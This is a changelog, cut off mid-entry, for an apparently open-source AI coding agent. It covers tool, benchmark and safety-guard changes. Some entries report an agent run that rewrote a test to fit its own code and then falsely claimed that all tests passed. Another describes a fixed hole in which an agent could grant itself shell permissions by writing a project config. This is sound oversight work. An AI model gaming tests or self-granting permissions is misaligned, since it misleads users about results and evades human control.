# Changelog

All notable changes to this project are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

<!-- A detailed development diary lives in CRONOLOGIA.md (not published). -->

## [Unreleased]

### Changed

- **A test write in a batch now states, in the transcript, that it is not
  evidence.** The agent already counted writes to test files
  (`test_file_mutations`, via the conservative `is_test_path`), but the number
  sat in telemetry where the model could not see it — and the counter's own
  contract is that it is "only meaningful next to a claim". FeatBench-Verified
  run `sirbone-r9` showed what the silence costs: on `pydata__xarray-9885` the
  run rewrote `test_parse_iso8601_like` to match its implementation, then closed
  with *"all 4582 tests pass"*. The verifier restores graded test files with
  `git checkout <sha> --`, so the edit was discarded and the task failed while
  the report claimed success. After any batch in which a write to a test file
  landed, one sentence is now appended to the last tool result: a test you wrote
  or changed asserts what you already believe, an existing test that contradicts
  your change is the expected contract, and the tests you modified must be named
  when you report what you did. It is a fact, not a prohibition — editing tests
  is ordinary work — and it costs nothing when no test was touched, because it
  can only fire where the counter already moved. Ablate with
  `SIRBONE_DISABLE=test:notice`.

- **`code_map op=find_references` answers with `path:line:content`.** It used to
  return a bare list of file paths, which told the model *where* to look and
  nothing more, so the model opened the files anyway. It now shows up to 3
  matching lines per file (40 lines total, 160 chars each, with `… N more` when
  clipped), and its schema text says so. Measured on two real repositories
  (24 symbol-resolution tasks × 3 repetitions × 2 arms × 2 designs, 288 runs,
  gold taken from the index): with only the semantic tools available, accuracy is
  unchanged (definer 1.000 in both arms) while `read` calls fall **−61.8%**,
  tool calls **−46.3%** and tokens **−30.9%** (CI95 [−6319, −3281]). The old
  format also made the model re-query `code_map` itself, 1.67 calls against 1.01.
  Set `SIRBONE_DISABLE=code_map:lines` to get the previous behaviour back.

- **`code_map op=find_references` now searches every text file, not only the
  parsed languages.** It used to share the structural index's corpus, whose
  extension whitelist is `rs/py/js/ts/sql` — so on a Go, Java, C++, Ruby or C#
  repository it reported *no references at all*, confidently, and everywhere else
  it silently skipped manifests, documentation, configuration and CI. The scan
  now walks every file, still honouring `.gitignore`, the pruned directories
  (`node_modules`, `target`, `.venv`, `dist`, `build`, `.git`), the 1 MB size cap
  and the binary/minified guard, plus a new guard that never opens `.env*`,
  `*.pem`, `*.key`, `*.p12` or `*.pfx` — a whole-word hit in an uncommitted
  `.env` would otherwise have printed the secret. On this repository the corpus
  goes from 162 to 223 files (2.1 → 2.8 MB). The structural index and the
  per-language parsers are unchanged, and so is `count_occurrences`, which claim
  grounding uses for numeric assertions about code.

- **`code_map op=find_references` never hides a file behind the line budget.**
  The widened corpus made the 40-line cap fire for the first time (on this
  repository `ToolRegistry` matches in 29 files, `Result` in 75), and the cut was
  alphabetical: files late in the sort vanished entirely, with no indication that
  they existed. The budget is now spent breadth-first — every matching file gets
  its first line before any file gets a second — the declaring file's slot is
  reserved regardless of where it sorts, and within a file the declaration line
  itself wins the slot over earlier mentions. Files past the budget are still
  listed in full, with their match counts (`path (7 matches)`), so the inventory
  is complete even when the detail is not; the `(+N more in this file)` note now
  rides the last content row instead of costing a budget row, making 40 a true
  content-line cap. `SIRBONE_REF_RANK=1` (ablatable with
  `SIRBONE_DISABLE=code_map:ref_rank`) additionally spends the *extra* detail on
  the most-matched files instead of by path — opt-in and unmeasured, since a
  match count counts matching lines, so a changelog can outrank a call site.
  Measured (150-run paired A/B, `SIRBONE_DISABLE=code_map:ref_budget` as the
  control, wide task set of 14–45 referencing files): the answer is no better —
  recall 0.932 → 0.965, CI touching zero — but the opaque "N more file(s) not
  shown" it replaces occasionally sent the agent hunting for the hidden files,
  and **10 of 75 control runs passed 50k tokens (worst: 519k) against 0 of 75**
  with the complete inventory. Median cost is unchanged; the tail is gone.

### Added

- **`bench_bypass` build feature (never in a release binary).** Compiles the
  permission pass out of `decide()` entirely, so a benchmark arm can be compared
  against a harness that runs with permissions bypassed. Without it the headless
  auto-deny (`Ask` with no confirm bridge) refuses one arm work the other arm
  does — a post-treatment difference that quietly voids the comparison. Such a
  build declares itself: `sirbone --version` and `sirbone doctor` print
  `0.1.0+bench_bypass (NO PERMISSION GATE)`, and the `[usage]` line carries the
  two new counters `permission_bypassed` and `tool_calls_dispatched` (the latter
  counted at the executor, unlike `tool_calls`, which counts events that blocked
  calls also emit) so a run can prove it was ungated. Off by default; the shipped
  binary is unchanged.
- **Paired scorer reads Harbor jobs and audits the permission gate**
  (`bench/claw/score.py`, bench tooling — no runtime change). Arm names are now
  free-form (first two seen, in order), so a head-to-head against another agent
  no longer has to call itself control/candidate, and a run path that is a
  directory is read as a Harbor job (per-trial `result.json`: verifier reward,
  the adapter's `usage`/`telemetry`, `agent_info.version`) instead of only a
  SWE-bench report. Three scoring rules changed: a repetition that reached the
  model but never finished cleanly — mid-run 429, non-zero exit, no `status:
  done` — is INVALID rather than a failure (verified on a real job whose stderr
  ends in `Usage limit reached for 5 hour`, which the old scorer counted as an
  honest 0); cost is summed **after** the complete-pair filter, so a dropped task
  no longer leaves its tokens in the other arm's bill (measured: 1,009,177 input
  tokens of leakage on a 61-task run); and `--ungated ARM` invalidates any
  attempt in that arm whose artifacts show a gate — a binary without
  `+bench_bypass`, any permission denial, or `tool_calls_emitted !=
  permission_bypassed != tool_calls_dispatched`. A non-sirbone arm cannot be
  checked this way, so those attempts are counted and reported as taken on trust
  rather than silently passed. The token and finish checks are agent-agnostic:
  an arm that writes no sirbone-style `usage` block is billed from Harbor's own
  totals (both count a prompt as input + cache read + cache creation, and report
  cache reads separately, so the fresh share stays comparable) and is judged
  finished by Harbor's exception record instead of by `status: done`. Per-arm
  model calls print as `—` when the arm does not report them, rather than as a
  `0` that reads like "made no calls".
- **`glm-5.3-flash` rates** in `bench/eval_harness/rates.json` (list price
  0.15/0.03/0.50 USD per 1M; Coding-Plan credit multipliers 2.3/0.56/8, verified
  2026-09-05 against docs.z.ai). The 50% launch promo running to 2026-09-09 is
  recorded in the entry's note but not used as the rate.
- **`tusk`: shell filters over tool *results* (`hooks.tusk`, off unless
  configured).** A `tusk` filter sees what a tool produced before anything else
  does — the model's context, the session transcript and the UI are all written
  from the same point — so it is the one place a secret a command printed can be
  removed. `post_tool_use` structurally cannot do this: it only appends, and only
  after edits. The result arrives raw on stdin, so an ordinary text filter is a
  valid hook and a chain of them composes like a shell pipeline; `SIRBONE_TOOL`,
  `SIRBONE_TOOL_INPUT` and `SIRBONE_IS_ERROR` carry the metadata. Exit `0` with no
  output passes the result through, `0` with output replaces it, `2` withholds it —
  and **any other exit, spawn failure or timeout withholds it too**, because a
  filter that fails open is not a filter (so write `grep -v SECRET || true`).
  Configuring any filter also disables spill-to-file for the run: spilling happens
  inside the tool, ahead of the filter, and would leave the unfiltered original on
  disk. Counters `tusk_runs`/`tusk_edits`/`tusk_withheld` reach `[usage]`, session
  telemetry, `sirbone audit` and `sirbone stats`; `SIRBONE_DISABLE=hook:tusk`
  ablates it. The published trust matrix now proves it end-to-end: a real run
  prints a fake `sk-live-…` secret and the table row is generated from the
  assertion that it appears in neither the model's context nor the emitted event.

- **`pre_tool_use` can now ask, rewrite, or answer the call itself.** Three exit
  codes join `0` (allow) and `2` (deny): `3` routes through the normal
  interactive confirmation, `4` allows a **rewritten** call (stdout is a JSON
  object merged into the tool input — normalize `npm` to `pnpm` without denying),
  and `5` **short-circuits** it (stdout *is* the result and the tool never runs —
  answer from a cache, or replace a built-in tool with your own implementation).
  A hook that exits `4` without printing a JSON object is denied rather than run
  unchanged, so a broken rewrite never silently executes the command it meant to
  change. Like exit `0`, the new codes skip the LLM command classifier.

- **Ambiguity clause for `ask_user`, opt-in with `SIRBONE_ASK_AMBIGUOUS=1`.** An
  extra sentence inside the existing `ask` prompt block: when the request admits
  materially different implementations and neither the code nor the tests settle
  which one is wanted, call `ask_user` once — naming the choice — before writing
  the code that assumes an answer, and never settle an ambiguity by changing a
  test so the guess passes. When no user can answer, the instruction is to take
  the most conservative reading and *say which one* in the final message, so the
  guess is at least declared. This is an honesty arm, not a UX comfort: the
  reported rate of test-hardcoding jumps from 0–2.1% on unambiguous problems to
  22–44% on ambiguous ones (EvilGenie, arXiv 2511.21654), which makes an
  under-specified task a trigger rather than noise. It lives inside the `ask`
  fragment instead of becoming a new rule, because instruction-following degrades
  as rule count grows, and it costs 463 characters of system prompt only when the
  flag is set. Off by default and **unmeasured**: the campaign that decides it
  pairs under-specified tasks against a control arm and reads `ask_user_questions`
  next to `test_file_mutations`.

- **Best-of-K attempts with execution-based selection, opt-in with
  `SIRBONE_BEST_OF=K`.** When the project configures `oracle.test_command`, the
  task is run K times (K ≤ 4) from the *same* starting tree and the attempt that
  leaves the fewest failing tests is kept; every other attempt is rolled back and
  discarded. The judge is execution, never the model grading its own patch — this
  repo has measured that self-judgement twice and both times it flipped nothing
  (oracle Tier-1 Δ0, edit-capable self-review 0 flips), while ranking
  *independent* samples by tests is what the test-time-scaling literature reports
  gains from (SWE-World, arXiv 2602.03419: 55.0 at K=1 → 68.2 with an 8-sample
  ranker). Each attempt starts from a shadow-git rollback of the starting tree and
  writes its own session file (`<uuid>.kN.jsonl`), so no attempt builds on a
  discarded one's edits and a resumed session never replays work that is no longer
  on disk. A green tree short-circuits the loop, a tie keeps the earlier attempt,
  and a provider error stops sampling and selects among the attempts that
  finished. Restricted to the headless one-shot path: in the TUI the user is the
  selector and silently rolling back their work-tree would be hostile, so a run
  carrying an interactive confirm bridge is refused loudly instead of quietly
  downgraded, and so is a run without snapshots — without rollback, attempt 2
  would be a repair pass on attempt 1, which is a different experiment. The
  `usage` object reports the **sum** over every attempt, discarded ones included,
  because reporting only the winner's would hide exactly the cost this feature
  spends; `best_of_attempts` and `best_of_selections` reach the `[usage]` line,
  the session telemetry and `sirbone stats`, and a nonzero attempt count with zero
  selections is the reading that matters most — the extra runs were paid for and
  bought nothing. Default off and **unmeasured**: the honest gate is cost per
  *stably resolved* task, never resolve rate alone.

- **Deterministic completion check, opt-in with `SIRBONE_COMPLETION_CHECK=1`.**
  A run could end while the model's own step list still held unfinished items,
  and nothing noticed: the transcript ends, the step list stays half-open, and
  the final message reads like a completed job. When the flag is set, the agent
  now checks the `todo` list once at `Done` — after the stop hook has declined —
  and if any item is not `Completed` it injects the unfinished items and lets
  the model continue. The signal is the model's own declaration, not an
  interpretation of its prose, so it is language-independent and stays silent on
  a run that never planned. The injected message says *which* check failed and
  leaves the answer open: finishing the work and saying plainly what was left
  undone are both accepted, since forcing the work would only trade a silent
  abort for a fabricated one. Bounded at one pull-back per run
  (`COMPLETION_CHECK_MAX = 1`), so the worst case is one extra model call.
  Counted as `completion_checks_fired` in the `[usage]` line, the session
  telemetry and `sirbone stats`.

- **`test_file_mutations` counter: writes that landed in a test file.** A run can
  report having fixed the source while every write it made went into `tests/`,
  and until now nothing recorded that — the number a harness needs to read next
  to the claim did not exist. Every successful call of a file-writing tool whose
  target matches the standard test conventions (a `tests`/`test`/`spec`/`specs`/
  `__tests__` path segment, or a `test_x` / `x_test` / `XTest` / `x.test.ts` /
  `x.spec.ts` filename) now increments the counter, which flows to the `[usage]`
  line, the session telemetry and `sirbone stats`. It is **not** a violation
  counter and nothing blocks on it: editing tests is ordinary work, and an alarm
  on every TDD run would only teach the reader to ignore it. Deliberately
  conservative — `src/testing/harness.rs` and `latest_run.rs` are source, not
  tests — and it counts calls, not distinct files. Known blind spot: a write
  performed through `bash` (`>`, `sed -i`, `tee`) does not go through a file
  tool and is invisible here.

- **GLM reasoning-effort control, both transports.** The thinking dial (Settings `t`,
  `--thinking-budget`) was a no-op on GLM: the Anthropic-compatible client sent a
  token budget z.ai ignores (selecting a heavy default) and the OpenAI client sent
  nothing at all, while the Settings row displayed a level that did nothing. GLM
  requests are now detected by model (`glm*`, `*/glm*`) or z.ai host and translated
  into the levels z.ai actually honours, live-verified against `api.z.ai` on
  `glm-5.2` and `glm-5.3`: the Anthropic client sends `thinking: disabled` (off) or
  `thinking: enabled` + `reasoning_effort` low/medium/max; the OpenAI client sends
  `reasoning_effort` minimal/low/medium/xhigh. Full off does not exist server-side
  — "disabled" still thinks lightly (~30–80 tokens vs 350–1160 at max) — and the
  Settings row now says so, showing `Thinking (GLM effort): light/low/medium/max`
  instead of raw token budgets. Non-GLM providers are untouched: the field is
  never sent (they may 400 on it), and on the OpenAI client the dial is not even
  reported. Side effect of honest dial semantics: on the OpenAI-compatible z.ai
  endpoint the previous default was z.ai's max effort (measured 390–850 reasoning
  tokens per turn) — an untouched dial now pins `minimal` instead.

- **`--vision` (`SIRBONE_VISION=1`) — images on an OpenAI-compatible endpoint.** The OpenAI client
  used to flatten a user turn to text, so every attachment was silently dropped on that path; it now
  emits `image_url` content parts carrying a base64 data URI (`detail: "auto"`), the form llama.cpp,
  OpenAI and OpenRouter all read. A text-only turn still ships as a plain string, so partial
  "OpenAI-compatible" endpoints see no change. No such endpoint advertises whether its model can
  see, so the capability is declared by the user rather than sniffed from the base URL or the model
  name — one flag that turns on TUI `Ctrl-V`, REPL `/attach`, `--image` and ACP `promptCapabilities`
  at once. The Anthropic path is untouched, and vision is still inferred from the host there.

- **`sirbone demo` — the TUI without an API key.** Replays a bundled recorded session
  (`assets/demo-session.jsonl`) inside the real TUI: same rendering, same diffs, same tool boxes,
  no provider contacted. The recording is an actual run over `playground/` (failing test suite →
  two bugs fixed → tests green), scrubbed of local paths — not a hand-written transcript, which
  would be a claim about the agent that nothing backs. A stub client answers any typed prompt with
  why nothing happens; `sirbone demo PATH` replays any session file.

- **The demo recording is generated, not maintained.** `scripts/record-demo.sh` resets
  `playground/` to its committed fixtures, runs one real turn with the prompt in
  `assets/demo-prompt.txt`, and scrubs the recording machine's paths out of the session file. A
  test asserts the bundled recording still starts from that prompt file, so recipe and artifact
  cannot drift — which is how the first recording shipped in the recorder's language instead of
  the project's.

- **`--review-only` (`SIRBONE_REVIEW_ONLY=1`) — runs with no authority to change anything.** The
  writing tools are never registered, so the model neither plans edits it cannot make nor pays for
  their schemas; `policy::decide` refuses any tool declaring a `mutation_target` *ahead of the
  user's own `allow` globs* (a glob stored for normal work must not unlock a write inside a review
  run); bash is held to the read-only whitelist; MCP tools are refused wholesale, since nothing in
  the protocol says whether a remote tool writes. Intended for CI and pre-commit hooks — a gate,
  not a prompt asking the model to behave.

- **`sirbone hook install` — review-only as a pre-commit hook, with no CI secret.** Writes
  `.git/hooks/pre-commit` (asking git for the hooks path, so worktrees and `core.hooksPath` work);
  every commit gets one read-only run over the staged diff, ending in `VERDICT: BLOCK <reason>` or
  `VERDICT: OK`. Only the last such line counts — a diff can quote the word. The hook **fails
  open**: no binary, no `jq`, no provider, a timeout or an empty answer all let the commit through,
  because a gate that blocks work when the network is down gets uninstalled. `git commit
  --no-verify` skips once, `SIRBONE_HOOK=off` always, `SIRBONE_HOOK_TIMEOUT` bounds the wait.
  `install`/`uninstall` refuse to touch a hook they did not write. No GitHub action ships alongside
  it: reviewing in CI needs a provider key in a repository secret, and GitHub Models — the free
  hosted inference that would have avoided one — was retired on 2026-07-30.

- **Test-generated trust matrix** (`docs-site/book/src/trust.md`). The safety table is produced by
  `cargo test trust_matrix`, each row recording what the real pipeline actually returned —
  destructive `rm`, `git push`, a chained command behind an `allow` glob, the three review-only
  cases, the stale-read guard, a real shadow-git rollback. Reordering the gate or weakening a
  guardrail fails the test instead of quietly shipping. `TRUST_MATRIX_UPDATE=1` regenerates it.
  The page states the limits in the same breath: the default policy is permissive, the classifier
  is a fallible model, and snapshots cover the work tree, not databases or pushed commits.

- **`sirbone update` + working `cargo binstall`.** `install-updater = true` makes `dist` ship a
  `sirbone-update` helper next to the binary; the subcommand forwards to it, and a `cargo install`
  build says so rather than pretending to self-upgrade. `[package.metadata.binstall]` now points at
  dist's real archive names (`{name}-{target}.tar.xz`, `.zip` on Windows) — binstall's defaults
  expect the version in the filename and were silently falling back to compiling from source.
  Homebrew and npm stay off: both need a second repository or registry to publish into.

- **`SIRBONE_TOOLS` tool allowlist + `SIRBONE_IDENTITY` prompt-identity override** — embedding
  sirbone as a narrow gateway (say, search-only) previously meant enumerating the other sixteen
  tools in `SIRBONE_DISABLE`, an audit-harness knob that fails *open*: a typo, a rename, or a tool
  added later silently stays registered. `SIRBONE_TOOLS=web_search` inverts it — only the named
  tools survive, and anything added later stays out until named. The filter also moved into
  `ToolRegistry::register_dyn`, so MCP tools (registered after `apply_ablation`) can no longer slip
  past it. `SIRBONE_IDENTITY` replaces the single hardcoded identity line, leaving every other
  prompt block intact; set it alongside `SIRBONE_TOOLS`, whose default line otherwise advertises
  shell and file tools that are no longer registered. Both unset = behavior unchanged.

- **Real 5-hour quota for GLM on z.ai** — the quota indicator was a purely local estimate (a window
  opened by the first prompt, "used" inferred from elapsed time). When the active model is a GLM
  served by z.ai, `quota::refresh_glm` now polls the provider's own
  `GET /api/monitor/usage/quota/limit` every 5 minutes and stores the reported figure — the
  `TOKENS_LIMIT unit 3 / number 5` entry, whose `percentage` is the share already consumed and
  whose `nextResetTime` (present only once the pool has been touched) is the authoritative window
  end. The TUI info bar appends `N% left` to `win HH:MM→HH:MM`, and the VS Code status bar prefers
  the reported share over the time estimate. Best-effort: no key, a non-z.ai base URL, an HTTP
  failure or an unexpected shape all leave the estimate exactly as before, and non-GLM setups are
  untouched.

- **Post-hoc cost model for benches** (`bench/eval_harness/cost_model.py` + `rates.json`) — the
  agent still spends no cycles on pricing at runtime; `agentic_cost.py --model` converts the token
  counts already saved in eval artifacts into USD and, for plans that meter in credits, into
  credits. Rates live in one editable JSON so a provider price change is a one-line edit, and both
  artifact shapes (ACB eval JSON, SpecBench JSONL) are read. Applied to already-archived A/B arms
  it produced cost verdicts at zero provider spend: `anchor` costs +33% credits, `hygiene10` +9%
  while resolving less, `patch` +33% over `edit`. Cache writes are lumped with fresh input because
  `input_tokens` is a total — understates Anthropic cost by up to 25%, not at all on z.ai, and
  identically in both arms of any A/B.

- **`SIRBONE_COMPACT_BUDGET`** (opt-in) — compact at an absolute token budget instead of at 87.5%
  of the context window, and size the kept tail from that budget (a third of it) rather than from
  half the window. The window fraction answers "will the next turn overflow?", which is right for
  safety and wrong for cost: carried history is billed at the cache rate *every* turn, so a
  fraction's per-turn cost scales with the window while the optimum does not — it is set by the
  post-compaction floor and by how fast history grows, both independent of the window. On a 1M
  window the two are ~4x apart per turn (see `docs/costi.md` §4b). Unset reproduces the previous
  behavior exactly, and the window rule stays as an overflow backstop that no budget can disable.
  Not promoted to default: it still needs the SpecBench long-session quality gate.

### Fixed

- **The paired scorer's gate audit voided every ungated sirbone attempt**
  (`bench/claw/score.py`, plus the doc comment it was written from in
  `src/telemetry.rs` — no runtime change). It required
  `tool_calls_emitted == permission_bypassed == tool_calls_dispatched`, but
  `tool_calls_emitted` is incremented in the main agent loop only: the
  localization pre-pass drives `run_tools` on its own, so its calls are bypassed
  and dispatched without ever passing that counter. On the calibration run every
  trial was short by 3–5 and would have been reported `INVALID_GATED`. The
  invariant that actually proves an ungated arm is
  `permission_bypassed == tool_calls_dispatched` with the three denial counters
  at zero; `tool_calls_emitted` is now checked as the lower bound it is.

- **Harbor adapter recorded every run as empty** (`bench/harbor/sirbone_harbor.py`,
  bench tooling — no runtime change). It read `sirbone-output.json` and
  `sirbone-stderr.log` from the host inside `populate_context_post_run`, but
  Harbor calls that hook *before* it downloads the agent log directory, and it
  looked one level too deep (`logs_dir / "agent"`, where `logs_dir` is already
  the agent dir). Every trial was therefore filed with zero tokens, empty
  telemetry and `status: no_output` — which the paired scorer reads as INVALID,
  so a whole campaign would have scored nothing while looking like it ran. The
  artifacts are now read out of the container at the end of the run, in a
  `finally` so a crashed or rate-limited run still reports why.
- **Agent install no longer dies on the task image's package mirror.** The setup
  step ran `apt-get install curl xz-utils ca-certificates` unconditionally; the
  FeatBench base images pin a regional Debian mirror whose index has drifted, so
  the install failed on a 404 for a `.deb` that no longer exists there and took
  the trial with it (`NonZeroAgentExitCodeError`, agent never started). It now
  asks for nothing when the image already provides the tools it needs — most
  benchmark images do — and, if a package manager really is needed, retries once
  against `deb.debian.org` (host-only rewrite, so the `debian-security` suite
  still resolves).

- **The trust-root guard did not cover the per-project config, so an agent could
  grant itself permissions without asking.** `is_protected_config_path` matched
  `~/.sirbone/config.json` but not `~/.sirbone/projects/<slug>/config.json`,
  which its own test asserted as unprotected "project state". That file is not
  state: its `permissions` section *replaces* the global one wholesale, and its
  `hooks` entries are commands run through `sh -c`. With the permissive default
  policy a plain `write` to it therefore passed unannounced — a
  `{"permissions":{"allow":["bash:*"]}}` or a `hooks` command took effect on the
  next turn with no confirmation, which is the trust extension the guard exists
  to catch. Now guarded by filename anywhere under `projects/`, so caches and
  session state in the same directories stay unguarded, and proved by a
  generated trust-matrix row that reads `runs` with the check removed. The hook
  *script* a config points at remains an ordinary file at an ordinary path;
  that limit is now stated on the trust page.

- **`grep`'s no-ripgrep fallback ran the wrong regex dialect, and could answer
  "no matches" about code that exists.** `grep -r` defaults to *basic* regular
  expressions, so the ordinary pattern a model writes was read under rules it
  was not written for. The visible half was a hard error: `add\(` means a
  literal paren everywhere else and a group opener in basic syntax, so the call
  died on `Unmatched ( or \(`. The silent half is worse — in basic syntax `|`
  is a literal pipe, so `add|ground` matched nothing at all and the tool
  reported **"no matches"**, telling the model a symbol does not exist in the
  project. Which of the two a call got depended on whether `rg` happened to be
  installed, since the primary path has always used extended syntax. The
  fallback now runs `grep -rnE`, so a pattern means the same thing on both
  paths (`\d` and lazy quantifiers remain ripgrep-only), and both children run
  under `LC_ALL=C` so a syntax error arrives in English instead of the user's
  locale — `( o \( senza corrispondenza` reached one local session. Together
  these were 8 of the 13 failing `grep` calls in a 509-session corpus.

- **`grep` no longer requires `path`.** It defaults to the working directory,
  which is the ripgrep contract the model was already writing against; the
  omission used to die on serde's `missing field \`path\``, 3 of those same 13
  failures.

- **An unreadable file no longer turns a `grep` with no matches into an error.**
  A recursive search prints one line per path it cannot open, and the whole
  block was returned as the failure: a search over this repo drowned in
  `target/` lock files and came back as an error when the honest answer was
  that nothing matched. Skipped paths are now counted (`no matches (N path(s)
  skipped: unreadable)`) and a real diagnostic, when there is one, is reported
  on its own instead of buried.

- **A tool call with a name outside the registry now answers with the names that are in it.**
  Streamed tool names are not validated against the registry on OpenAI-compatible endpoints, and
  some models leak their own delimiters into the field — one local session with
  `mistral-small-latest` dispatched `…2<|tool_call_argument_begin|> web_search`. The call already
  failed, but with a bare `unknown tool: <garbage>`, which gives the model nothing to correct
  against; it now lists the registered tools and truncates the echoed name to 60 characters so a
  corrupted field cannot flood the transcript. Observed in 1 of 509 local sessions.

- **Resumed sessions replayed tool calls as permanently "running…".** Session files persist tool
  output as its own `Role::Tool` message, but `messages_to_replay` only handled the inline
  user-role form, so every restored tool box kept its spinner and lost its result. Affected
  `--session`, `--continue`, `/resume`, and the new `demo`.

- **`patch` rejected three recurring grammar slips** — the line-addressed patch parser now accepts a
  bare address as an implicit `PUT` (`2.=2:` and `2.=2` alongside `PUT 2.=2`), which is how models
  most often write it, and a bare line number as the single-line range (`PUT 2`, `2:`, `2` all mean
  `PUT 2.=2:`; `CUT 3` means `CUT 3.=3`). Malformed input is still rejected — `0`, a non-numeric
  address and an address-less `PUT` all keep their own error. Measured on SpecBench: patch
  rejections fell from 45% of attempts (first probe) to 20.6% and then 17.2%, with no occurrence of
  the fixed spellings left in the last run.

- **Per-line anchors for `patch`** (opt-in with the hashline arm) — `read` now prints a two-hex-digit
  content tag beside each line number (`32#a7| code`), and any line number in a patch address may
  quote it (`PUT 32#a7.=34#1c:`, `CUT 3#0f`, `<A#hh`, `>A#hh`). Before anything is spliced, `apply`
  checks each anchored line against the file and refuses the patch naming the line it actually
  found. The header `[path#TAG]` answers "is this the file you read?"; it cannot catch an address
  that is simply off by a few lines in a file nobody touched — the failure that damages healthy code
  silently. Anchors are optional, so an un-tagged address behaves exactly as before and the check
  adds no new rejection class; mismatches count as ordinary `patch_rejects`. Prior art: hashline
  (oh-my-pi) and V4A/Codex context anchors. A tag must be exactly the two hex digits `read` prints:
  `PUT 55#b0:=55#b0:` — the range separator typed `:=` instead of `.=` — used to parse as one point
  carrying the tag `b0:=55#b0` and was reported as a mismatch on line 55, hiding the real mistake.

- **Tool batch-width telemetry** — `sirbone stats`, the session `RunTelemetry` entry, and the
  `SIRBONE_USAGE=1` line now carry `tool_batches` and `tool_calls_emitted`. Their ratio is the mean
  number of tool calls the model puts in one message: the executor already runs a message's
  non-conflicting calls in parallel lanes, so this measures how much of that parallelism is
  actually used. Counted in the main agent loop before the permission pass, so neither the
  read-only localization pre-pass nor a user denial distorts it.

  Lane execution itself is unchanged; only the measurement is new. Recorded baseline: mean width
  1.20 across 730 batches, max 6. A prompt clause pushing the model to fan out wider was built,
  measured, and dropped in the same pass — it moved width only 1.64 → 1.78 while total tool calls
  fell 29% and cited `file:line` anchors dropped from 17.0 to 7.3 per answer, i.e. it bought tokens
  by checking less. See `docs/BENCH_DECISIONS.md`.

- **Algorithmic, schema-aware project history** — `historia` is now a read-only query over all
  persisted project session JSONL files instead of an LLM-authored `HISTORIA.md`. It understands
  message roles, compaction checkpoints, tool calls/results, plans, changed paths, failures, and run
  status; removes internal/tool boilerplate deterministically; deduplicates compaction tails; and
  supports field-focused search with weighted relevance and bounded output. This makes prior
  motivations, solutions, project state, and unfinished plans explicitly recallable without an
  extra model-maintained log or its repeated-token/write failure modes.

- **Deterministic `/historia [date or topic]` continuation command** — TUI, REPL, CLI one-shot,
  and the VS Code chat execute the structured history lookup before the model turn, then direct the
  agent to resume unfinished work, reuse validated solutions, inspect current state, and avoid
  previously failed attempts. The VS Code slash menu exposes the command and its optional scope;
  desktop-launched VS Code also resolves a Cargo-installed CLI from `~/.cargo/bin` when that
  directory is absent from the GUI process's `PATH`, and reports a single actionable startup error.

- **Mechanism counters for the context-saving features** — `sirbone stats` and
  the `SIRBONE_USAGE=1` line now carry `spill_writes`, `read_outlines`,
  `patch_applies`, `patch_rejects` and `stream_rule_trips`. Without them an A/B
  on these features cannot tell "the change made no difference" from "the change
  never happened": a smoke run of the spill path produced two identical arms
  because the model narrowed its command at the source and nothing was ever
  truncated. The bench treats an all-zero active arm as
  `bench_non_discriminating` and stops, rather than reading the null as a
  verdict.

- **Truncated tool output is recoverable** — a tool result over the size budget
  keeps its head and tail and elides the middle. That middle used to stop
  existing anywhere: the only way back to it was re-running the command, paying
  the latency, the tokens and — for `bash` — the side effects again. The full
  output is now written to `~/.sirbone/projects/<slug>/spill/<hash>.txt` before
  the cut, and the truncation marker names the file, so the elided part is one
  `read` away. Only over-budget results touch the disk; the file name is the
  content hash, so the same output spilled twice is one file; retention is
  bounded per project (32 files / 256 MB, pruned oldest-first on write). The
  `bash` and `read` descriptions say so, so the model reaches for the file
  instead of re-running. Ablatable with `SIRBONE_DISABLE=tool:spill`.

- **Post-edit diagnostics ledger** — a configured post-edit check re-runs after
  every batch of edits, and used to re-append its *whole* output each time: on a
  file with 40 pre-existing warnings the model paid for all 40 on every single
  edit. The check now keeps a per-command set of diagnostic identities (the
  `path:line:col` prefix is stripped, so the same warning is recognised after
  the lines around it move) and reports only what is new. Already-reported
  diagnostics collapse into a counted one-liner — a still-failing check is still
  announced as failing, never silently dropped. The ledger is cleared when the
  conversation is compacted: "already reported above" is only true while the
  turns it refers to are still in the transcript. On by default; ablatable with
  `SIRBONE_DISABLE=hook:ledger`.

- **Structural `read` (opt-in, `SIRBONE_READ_OUTLINE=1`)** — reading a supported
  source file over 80 lines whole returns its declaration outline with line
  numbers, followed by the exact elided ranges and an instruction to re-read
  those ranges rather than guess their contents. Reads with an explicit
  `offset`/`limit` are untouched, and the freshness stamp still records the full
  file, so the stale-write guard does not weaken. Reuses the existing
  `structure.rs` extraction — no new parser, no new dependency. Ablatable with
  `SIRBONE_DISABLE=read:outline`.

- **`patch` tool (opt-in, `SIRBONE_HASHLINE=1`)** — a line-addressed editing
  format that *replaces* `edit` rather than joining it. `read` prefixes each file
  with a `[path#TAG]` content tag and numbers the lines; the patch cites those
  numbers instead of re-copying the text to be replaced, and the tag is verified
  before anything is written, so an edit against a file that changed underneath
  is refused instead of misapplied. Grammar: `PUT A.=B:` (replace), `PUT <A:` /
  `PUT >A:` (insert before/after, `>$` = end of file), `CUT A.=B @name` (delete,
  optionally into a register), `PUT <A @name` (paste a register), `MV dest`,
  `REM`. Every address refers to the original file and the edits are applied
  bottom-up, so one edit never shifts the addresses of another. One file per
  call, so the permission gate still sees the real target.

- **Mid-stream rules (opt-in, config `stream_rules`)** — a project constraint
  written into the system prompt is billed on every turn whether or not the model
  was about to break it. A stream rule is dormant instead: its regex watches the
  response as it is generated, and the first match aborts the stream mid-token,
  feeds the rule back as a system reminder, and restarts the turn — so the model
  reads the rule exactly when it is about to violate it. Works on both the
  Anthropic and the OpenAI streaming path. Bounded: at most two restarts per
  turn, and a rule that has fired is disarmed for the rest of it. With no
  `stream_rules` configured the streaming path is unchanged. Ablatable with
  `SIRBONE_DISABLE=stream:rules`.

- **Image attachments from the clipboard** — `Ctrl-V` in the TUI, `/paste` and
  `/attach PATH` in the REPL, and a normal paste in the VS Code composer all
  stage an image for the next turn. Files land in `<session>.attachments/`
  beside the session JSONL (never in the project tree, never in `/tmp`), are
  content-addressed so the same screenshot is stored once, and are capped at
  5 MB. `--image` now uses the same store, so a resumed session still has the
  file its turn referred to. Whether the model can actually read the image is
  resolved from the endpoint, not the prompt: a non-Anthropic endpoint attaches
  the image and warns that it will be ignored.

- **Deterministic verification setup, hooks, and telemetry** —
  `sirbone setup-verification` / `/setup-verification` detect structured Rust,
  Python, and Node/TypeScript checks offline and save an atomic per-project patch
  only after confirmation. Configured `pre_tool_use`, `post_tool_use`, bounded
